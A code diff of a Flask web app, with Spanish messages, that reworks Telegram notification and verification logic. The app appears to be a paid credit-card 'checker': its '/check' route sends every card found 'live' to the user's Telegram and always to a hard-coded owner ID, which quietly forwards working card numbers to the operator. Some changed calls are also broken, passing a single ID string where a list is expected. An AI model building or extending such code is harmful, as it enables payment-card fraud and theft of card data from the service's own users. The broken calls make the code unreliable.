@@ -38,7 +38,6 @@ class User(db.Model):
 
 
 
-
 class Key(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     key = db.Column(db.String(128), unique=True, nullable=False)
@@ -138,32 +137,7 @@ def logout():
 
 from flask import request, session, jsonify
 
-@app.route('/save_telegram_id', methods=['POST'])
-def save_telegram_id():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
 
-    telegram_id = request.json.get('telegram_id')
-    if not telegram_id:
-        return jsonify({'status': 'error', 'message': 'Telegram ID inválido.'}), 400
-
-    user = User.query.get(session['user_id'])
-    if not user:
-        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
-
-    user.telegram_id = telegram_id
-    try:
-        db.session.commit()
-    except Exception as e:
-        db.session.rollback()
-        return jsonify({'status': 'error', 'message': f'Error al guardar Telegram ID: {str(e)}'}), 500
-
-    # Confirmar que guardó bien
-    user_refreshed = User.query.get(session['user_id'])
-    if user_refreshed.telegram_id == telegram_id:
-        return jsonify({'status': 'success', 'message': 'Telegram ID guardado correctamente.'})
-    else:
-        return jsonify({'status': 'error', 'message': 'No se pudo guardar el Telegram ID.'}), 500
 
 
 @app.route('/redeem_key', methods=['POST'])
@@ -219,18 +193,96 @@ def add_admin():
 
 
 
-def enviar_telegram(mensaje, ids=[]):
-    chat_ids = set(ids + [OWNER_TELEGRAM_ID])
-    for chat_id in chat_ids:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = {'chat_id': chat_id, 'text': mensaje, 'parse_mode': 'Markdown'}
+
+
+import asyncio
+import threading
+bot = Bot(token=TELEGRAM_BOT_TOKEN)
+
+import asyncio
+
+import asyncio
+
+async def send_message(chat_id, message):
+    try:
+        await bot.send_message(chat_id=chat_id, text=message)
+        print(f"Mensaje enviado a {chat_id}")
+        return True
+    except Exception as e:
+        print(f"Error enviando mensaje a {chat_id}: {e}")
+        return False
+
+def send_messages_to_multiple(telegram_ids, message):
+    try:
+        loop = None
         try:
-            req.post(url, data=data)
-        except Exception as e:
-            print(f"Error enviando Telegram a {chat_id}: {e}")
+            loop = asyncio.get_running_loop()
+        except RuntimeError:
+            pass
+        
+        if loop and loop.is_running():
+            # Si hay loop corriendo (por ejemplo, dentro de un thread en Flask), usa run_coroutine_threadsafe
+            tasks = [bot.send_message(chat_id=tid, text=message) for tid in telegram_ids]
+            futures = [asyncio.run_coroutine_threadsafe(task, loop) for task in tasks]
+            # Esperar resultados
+            for future in futures:
+                future.result()
+        else:
+            # No hay loop corriendo, crea uno y corre gather para enviar en paralelo
+            async def send_all():
+                await asyncio.gather(*(send_message(tid, message) for tid in telegram_ids))
+            asyncio.run(send_all())
+        return True
+    except Exception as e:
+        print(f"Error enviando mensajes: {e}")
+        return False
+
+
+
+@app.route('/save_telegram_id', methods=['POST'])
+def save_telegram_id():
+    if 'user_id' not in session:
+        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
+
+    telegram_id = request.json.get('telegram_id')
+    force = request.json.get('force', False)  # para forzar reemplazo
+    if not telegram_id:
+        return jsonify({'status': 'error', 'message': 'Telegram ID inválido.'}), 400
+
+    user = db.session.get(User, session['user_id'])
+    if not user:
+        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
+
+    # Verificar si ya tiene telegram_id guardado y no está forzando reemplazo
+    if user.telegram_id and user.telegram_id != telegram_id and not force:
+        return jsonify({
+            'status': 'confirm',
+            'message': f'Ya tienes un Telegram ID guardado ({user.telegram_id}). ¿Quieres reemplazarlo?',
+        })
+
+    # Guardar el telegram_id y generar código
+    user.telegram_id = telegram_id
+    code = str(random.randint(100000, 999999))
+    user.verification_code = code
+
+    try:
+        db.session.commit()
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({'status': 'error', 'message': f'Error al guardar Telegram ID y código: {str(e)}'}), 500
+
+    # Enviar código de verificación por Telegram
+    msg = f"Tu código de verificación es: {code}"
+    sent = send_messages_to_multiple(telegram_id, msg)
+    if not sent:
+        return jsonify({'status': 'error', 'message': 'No se pudo enviar el mensaje de verificación. Verifica el Telegram ID.'}), 400
+
+    return jsonify({'status': 'success', 'message': 'Telegram ID guardado y código enviado para verificación.'})
+
 
 @app.route('/start_telegram_verification', methods=['POST'])
 def start_telegram_verification():
+    # Puedes mantener esta ruta igual o eliminarla si usas la lógica en save_telegram_id
     if 'user_id' not in session:
         return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
 
@@ -238,11 +290,10 @@ def start_telegram_verification():
     if not telegram_id:
         return jsonify({'status': 'error', 'message': 'Telegram ID inválido.'}), 400
 
-    user = User.query.get(session['user_id'])
+    user = db.session.get(User, session['user_id'])
     if not user:
         return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
 
-    # Generar código de 6 dígitos
     code = str(random.randint(100000, 999999))
     user.verification_code = code
 
@@ -252,13 +303,14 @@ def start_telegram_verification():
         db.session.rollback()
         return jsonify({'status': 'error', 'message': f'Error interno: {str(e)}'}), 500
 
-    # Enviar código por Telegram al ID que dio el usuario
     msg = f"Tu código de verificación es: {code}"
-    sent = send_message_to_telegram_user(telegram_id, msg)
+    sent = send_messages_to_multiple(telegram_id, msg)
     if not sent:
         return jsonify({'status': 'error', 'message': 'No se pudo enviar el mensaje de verificación. Verifica el Telegram ID.'}), 400
 
     return jsonify({'status': 'success', 'message': 'Código enviado a tu Telegram. Ingresa el código para verificar.'})
+
+
 
 @app.route('/confirm_telegram_code', methods=['POST'])
 def confirm_telegram_code():
@@ -270,7 +322,7 @@ def confirm_telegram_code():
     if not telegram_id or not code:
         return jsonify({'status': 'error', 'message': 'Faltan datos.'}), 400
 
-    user = User.query.get(session['user_id'])
+    user = db.session.get(User, session['user_id'])
     if not user:
         return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
 
@@ -288,15 +340,7 @@ def confirm_telegram_code():
         return jsonify({'status': 'error', 'message': 'Código incorrecto.'}), 400
 
 
-bot = Bot(token=TELEGRAM_BOT_TOKEN)
 
-def send_message_to_telegram_user(telegram_id, message):
-    try:
-        bot.send_message(chat_id=telegram_id, text=message)
-        return True
-    except Exception as e:
-        print(f"Error enviando mensaje: {e}")
-        return False
 @app.route('/check', methods=['POST'])
 
 def check_card():
@@ -328,23 +372,27 @@ def check_card():
 
         if result['status'] == 'live':
             telegram_ids = set()
-
-            # Obtener usuario actual (asegúrate de que session['user_id'] esté definido)
-            user = User.query.get(session['user_id'])
-            
-            # Si tiene telegram_id guardado, agregarlo a la lista de IDs para enviar
+            user = db.session.get(User, session['user_id'])
             if user and user.telegram_id:
                 telegram_ids.add(user.telegram_id)
-            
-            # Agregar también el ID del propietario siempre
             telegram_ids.add(OWNER_TELEGRAM_ID)
+            send_messages_to_multiple(list(telegram_ids), f"✅ 𝗟𝗜𝗩𝗘 - {result['cc']}\n{result['message']}")
 
-            # Enviar mensaje sólo a estos IDs
-            enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", list(telegram_ids))
 
         return jsonify(result)
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
+
+import asyncio
+
+async def enviarmensajecchats(message, chat_ids):
+    for chat_id in chat_ids:
+        try:
+            await bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+        except Exception as e:
+            print(f"Error enviando mensaje a {chat_id}: {e}")
+
+
 
 @app.route('/ping')
 def ping():
@@ -359,7 +407,5 @@ if __name__ == '__main__':
 
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-
-
 
 
